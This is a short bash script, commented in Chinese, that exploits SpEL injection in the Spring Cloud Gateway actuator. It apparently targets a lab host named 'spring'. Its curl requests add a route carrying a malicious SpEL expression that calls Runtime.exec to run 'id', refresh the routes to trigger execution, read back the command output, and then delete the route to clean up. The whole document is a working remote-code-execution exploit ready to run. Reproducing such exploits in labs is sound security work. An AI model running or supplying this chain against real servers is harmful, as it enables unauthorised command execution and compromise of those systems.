#!/bin/bash

# 添加一个包含恶意SpEL表达式的路由, 利用漏洞执行 id 命令
curl -X POST --location "http://spring:8080/actuator/gateway/routes/hacktest" --http1.1 \
    -H "Host: spring:8080" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" \
    -H "Content-Type: application/json" \
    -d "{
          \"id\": \"hacktest\",
          \"filters\": [{
            \"name\": \"AddResponseHeader\",
            \"args\": {
              \"name\": \"Result\",
              \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"
            }
          }],
          \"uri\": \"http://example.com\"
        }"

# 应用刚添加的路由。这个数据包将触发SpEL表达式的执行
curl -X POST --location "http://spring:8080/actuator/gateway/refresh" --http1.1 \
    -H "Host: spring:8080" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" \
    -H "Content-Type: application/x-www-form-urlencoded"

# 查看执行结果
curl -X GET --location "http://spring:8080/actuator/gateway/routes/hacktest" --http1.1 \
    -H "Host: spring:8080" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" \
    -H "Content-Type: application/x-www-form-urlencoded"

# 删除刚才添加的路由
curl -X DELETE --location "http://spring:8080/actuator/gateway/routes/hacktest" --http1.1 \
    -H "Host: spring:8080" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

# 刷新路由
curl -X POST --location "http://spring:8080/actuator/gateway/refresh" --http1.1 \
    -H "Host: spring:8080" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" \
    -H "Content-Type: application/x-www-form-urlencoded"